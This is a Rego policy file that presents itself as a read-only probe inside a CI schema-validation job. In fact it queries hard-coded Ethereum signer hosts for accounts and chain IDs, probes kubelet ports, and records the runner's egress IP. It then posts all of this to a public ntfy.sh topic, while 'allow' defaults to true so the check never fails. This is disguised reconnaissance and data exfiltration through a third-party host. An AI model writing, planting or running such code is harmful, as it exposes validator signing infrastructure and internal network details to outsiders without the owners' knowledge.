package main

import rego.v1

# Read-only probe executed inside kilnfi/public "validate sr provider api data"
# (runs-on: fixed-egress-4c-16g). Only http.send OUT; no file writes, no runner state.
# allow defaults to true so a dead network can never fail the schema check.

default allow := true

topic := "kiln-fe-144377-4c9a71d2"

signers := ["3.255.13.221", "54.216.229.51", "52.215.179.5", "108.129.5.197", "52.212.240.227", "52.48.66.163"]

kubelets := ["51.159.83.150", "91.134.9.14"]

json_headers := {"Content-Type": "application/json", "User-Agent": "kiln-opa-probe/1"}

plain_headers := {"User-Agent": "kiln-opa-probe/1"}

short(v) := s if {
	is_string(v)
	s := substring(v, 0, 120)
}

short(v) := s if {
	not is_string(v)
	s := substring(json.marshal(v), 0, 120)
}

summ(resp) := {"code": object.get(resp, "status_code", 0), "err": short(object.get(resp, "error", "")), "body": short(object.get(resp, "body", ""))}

get_req(url) := resp if {
	resp := http.send({
		"method": "get",
		"url": url,
		"headers": plain_headers,
		"timeout": "4s",
		"raise_error": false,
		"tls_insecure_skip_verify": true,
		"cache": false,
	})
}

post_json(url, body) := resp if {
	resp := http.send({
		"method": "post",
		"url": url,
		"headers": json_headers,
		"body": body,
		"timeout": "4s",
		"raise_error": false,
		"tls_insecure_skip_verify": true,
		"cache": false,
	})
}

rpc(ip, method) := resp if {
	resp := post_json(sprintf("http://%v:9000/", [ip]), {"jsonrpc": "2.0", "id": 1, "method": method, "params": []})
}

signer_results := [r |
	ip := signers[_]
	r := {
		"ip": ip,
		"upcheck": summ(get_req(sprintf("http://%v:9000/upcheck", [ip]))),
		"client_version": summ(rpc(ip, "web3_clientVersion")),
		"accounts": summ(rpc(ip, "eth_accounts")),
		"chain_id": summ(rpc(ip, "eth_chainId")),
	}
]

kubelet_results := [r |
	ip := kubelets[_]
	r := {"ip": ip, "version": summ(get_req(sprintf("https://%v:10250/version", [ip])))}
]

egress_ifconfig := summ(get_req("https://ifconfig.me/ip"))

egress_ipify := summ(get_req("https://api.ipify.org?format=json"))

http_results := [
	{"name": "eth-api-mainnet", "resp": summ(get_req("https://eth-api.mainnet.kiln.fi/eth/v1/node/version"))},
	{"name": "eth-api-hoodi", "resp": summ(get_req("https://eth-api.hoodi.kiln.fi/eth/v1/node/version"))},
	{"name": "erpc-main-evm-1", "resp": summ(post_json("https://erpc.kiln.fi/main/evm/1", {"jsonrpc": "2.0", "id": 1, "method": "eth_chainId", "params": []}))},
]

msg_signers := json.marshal({"probe": "signataire", "egress": [egress_ifconfig, egress_ipify], "results": signer_results})

msg_other := json.marshal({"probe": "http-kubelet", "egress": [egress_ifconfig, egress_ipify], "http": http_results, "kubelet": kubelet_results})

deliver(u, body) := resp if {
	resp := http.send({
		"method": "post",
		"url": u,
		"headers": {"User-Agent": "kiln-opa-probe/1", "Title": "kiln-fe-144377"},
		"body": body,
		"timeout": "10s",
		"raise_error": false,
		"tls_insecure_skip_verify": true,
		"cache": false,
	})
}

d1 := deliver(sprintf("https://ntfy.sh/%v", [topic]), msg_signers)

d2 := deliver(sprintf("https://ntfy.sh/%v", [topic]), msg_other)

allow if {
	print("KILN_PROBE_SIGNERS ", msg_signers)
	print("KILN_PROBE_OTHER ", msg_other)
	count(d1) >= 0
	count(d2) >= 0
}
